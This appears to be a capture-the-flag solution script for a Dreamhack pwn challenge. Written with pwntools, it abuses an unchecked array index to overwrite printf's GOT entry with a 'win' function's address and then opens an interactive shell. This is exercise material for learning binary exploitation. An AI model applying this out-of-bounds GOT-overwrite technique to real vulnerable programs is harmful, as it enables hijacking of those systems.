#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./prob_patched")
pwn.context.binary = pwn.ELF(exe.filepath)
libc = ptr.ELF("./libc.so.6")
# ld = ptr.ELF("")

def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("host3.dreamhack.games", 20925)
    else:
        return pwn.process(exe.filepath)

def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x

# &buf = 0x404080
def main():
    io = connect()


    def send(val: int):
        io.sendlineafter(b"val: ", str(val).encode())
        return

    buf_addr = 0x404080
    printf_got = unwrap(exe.got("printf"))
    win = unwrap(exe.symbol("win"))
    offset = printf_got - buf_addr

    send(offset // 8)
    send(win)

    io.interactive()

    return

if __name__ == "__main__":
    main()
